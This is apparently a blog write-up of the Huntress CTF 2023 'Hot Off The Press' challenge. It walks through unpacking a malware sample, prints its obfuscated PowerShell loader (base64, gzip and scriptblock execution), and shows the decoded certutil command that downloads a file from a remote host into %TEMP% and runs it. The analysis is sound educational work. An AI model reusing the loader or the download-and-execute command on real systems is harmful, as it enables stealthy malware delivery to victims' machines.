---
title: "Hot Off The Press"
date: 2023-10-03T13:11:20-10:01
#draft: true
tags: ['CTF','Writeups', 'Malware', 'Medium']
---
 
# [Home](https://jjolley91.github.io/blog/) >

###  [Huntress CTF](https://jjolley91.github.io/blog/huntress_ctf_2023) >  [Medium Challenges](https://jjolley91.github.io/blog/huntress_ctf_2023/2.Medium)

## [Back](https://jjolley91.github.io/blog/huntress_ctf_2023/zerion)  <> [Next](https://jjolley91.github.io/blog/huntress_ctf_2023/2.Medium/traffic) 

### Oh wow, a malware analyst shared a sample that I read about in the news!

### But it looks like they put it in some weird kind of archive...? Anyway, the password should be infected as usual! 

We are given a UHarc archive file for this challenge. 

we can download the software to decompress the file from sam.gleske [here](https://sam.gleske.net/uharc/) and extract the contents using the password 'infected'.

The result will be a .ps1 file that windows will flag as malware immedately. we can open the file in a text exitor of choice and begin deobfuscating the code.
```ps1
$x = ([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4sI'+'AIeJ'+'G2UC/+1X'+'bU/jOBD+3l9hrS'+'IlkU{0}'+'VFvb{1}IiFdWqD'+'bPRJKS8vR'+'brUKy'+'TR168TFcQplb//7'+'jfNSygJ73{1}lI94F'+'IVvwyMx4/M'+'7YfT9PYl5TH'+'hH7sku8VUnxd'+'T3gRMTT/ku'+'/fWUSjS3Mzp'+'oX7zCWHxBjby+UR'+'jzwaTw4OWq'+'kQ{1}M'+'u8XW2'+'DtJM{1}'+'omtGI'+'TFM8he5nIGAnbP'+'rOfiSf'+'Cfat2qb8W'+'uPFW{0}rlufP'+'gOzYcaD'+'GTrnvKbeq/'+'SWj0tC/ftXN8U5'+'9Uj2+ST2'+'WGHp/nUiIqgFjuk'+'l+mGrCi/USDN2'+'hvuAJn8rqJY'+'13G9VBn'+'HhTcNHa'+'ChyQMx4'+'kul'+'nZ{0}{1}a'+'AT{1}Wcr0kZyUUMHa'+'tdwX0'+'7CAQkiW6RsTI'+'/nkx+N8bF'+'3{0}00'+'ljS'+'CaieWIPiyD'+'2JFfUiq'+'n704YNC'+'D6QS1+l{0}Q'+'OJyYJoq'+'t+AIM{0}U4Zs8'+'i/MWO4c'+'Fsi91olY1sJpbpS'+'mBYG'+'9Jl1OjxIG'+'eSa+jOO'+'5kl'+'g4pcngl'+'n5UalMy7'+'yJvPq'+'3o6eZs2mX'+'3zgbAHTX6PK'+'{1}Zr'+'qHp'+'GYRBy'+'f2JBdrbGoXIgVz'+'sgGbaNGe/Yf'+'1SmP1UhP1V'+'u0U'+'e8ZDToP'+'JRn0r'+'7tr0pj38q{1}'+'ReTuIjmNI'+'YjtaxF1G/'+'zFPjuWjAl{1}{1}GR'+'7UUc9{1}9Qy8'+'GIDgCB'+'q{1}nFb4qKZ6oHU'+'dUbnSbKWUB'+'CNvHiCb'+'oFQbbfO'+'xMHjJD78QORAhd3'+'sYs'+'1aa4O6'+'CU{0}nb'+'{1}upxdtVFIbz{1}v'+'SSzSTXF7+hbpg8c'+'gsIgdJ7QYs'+'lPJs6r+4K6T'+'Mkl9{0}5Glu'+'Yn5{1}5zFtC'+'0eJ1KkPgYVIbj'+'o{0}8'+'GnHlOIWO'+'QzDaC57'+'tOwnF5/Fo+Wxx'+'juG7S0wnhgj8'+'Kh{0}1Wq'+'CPQ0Swuz2g'+'fZiZYMIpTJjosT5'+'oV4'+'OBS7I'+'8st{0}4RAf8HRc'+'hPkGa+Q'+'KSHZchP'+'D3WdcWmRIhcTDR6'+'GM2fVfnHhy'+'6uTOtAQ'+'UwTGyvTVur'+'qXKfi0+P'+'W8sVI4WAGVwCI'+'lQn'+'AgeNb0{1}ftv{0}Dxjj'+'Q6dlh+/lvbyX'+'9/K/{0}22X+XG'+'vHr'+'RZ0mnV635'+'0N7'+'+6d'+'Pmob8sR'+'bf{0}gc+/2j'+'O6vT'+'ufHt856786'+'dO6lz{1}e5i'+'e302D2/PjuxV'+'tzFMr'+'xqfFqP{0}3nQU3'+'c1G'+'9zXmzq+'+'YGzn4P8b'+'iM7f'+'Rwf85lk'+'4+Nh8w5'+'36Q1Z17P6vn7'+'WP8h1gW2R/n+0'+'m2g8UuZ'+'M{0}M3kN7UYyHh'+'T17M5+aw22'+'ch1+GvZO{0}oc3+bF'+'+FX2jz'+'PmifrIOWvTq'+'nNhse'+'D91Ba+iPwsPD'+'D2ZlPKCx3G1M1{1}W'+'+qwhS'+'RWP+p/'+'2tS+Al6'+'ud4'+'Ipl5DC8H5HTl'+'FX3C'+'xUnB1{0}qcKg3DU'+'{1}x/'+'ASIGhvQYCXR5sd'+'mMcV+RxJzSIUP'+'NeaOisYNO'+'5tVzNZNsBM0'+'H9lh2HRyM'+'0{1}u8{0}{0}O7rH'+'oKcShnVu1ut1ZD'+'7le7q+3htfj6'+'pbX4cm3ktix'+'FHjNwNtZZZt2s'+'0CkxjDfHC9'+'8H{1}unK{0}xB7C'+'Tyce'+'4H0AvlOfukrCJ'+'ucs20A'+'i5Vt8'+'u{1}R'+'fghcHVc/Vq+'+'D{0}FPQxA7'+'c{1}{1}0q/rzFxrX0'+'+uz6TZOnIC8z/AX'+'/mDwPfb8YfVVC1a'+'wcoCfd'+'jzseiN/bIX'+'DpUYmCf'+'aRhDPKHwQtAFB'+'tmK8gqP{0}gbpsWn'+'Hspnq'+'dxx8'+'emlmODf2GZMc5'+'4PA'+'AA=')-f'L','E')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()));$x
```
Once you decode the base64 encoded message it will look like this:

```ps1
certutil -urlcache -f http://.103.163.187.12:8080/?encoded_flag=%66%6c%61%67%7b%64%62%66%65%35%66%37%35%35%61%38%39%38%63%65%35%66%32%30%38%38%62%30%38%39%32%38%35%30%62%66%37%7d %TEMP%\f & start /B %TEMP%\f
```

All that is left to do now is urldecode the flag:


![hotp](https://github.com/jjolley91/blog/blob/main/static/Huntress_CTF_2023/press_flag.png?raw=true)

## [Back](https://jjolley91.github.io/blog/huntress_ctf_2023/zerion)  <> [Next](https://jjolley91.github.io/blog/huntress_ctf_2023/2.Medium/traffic) 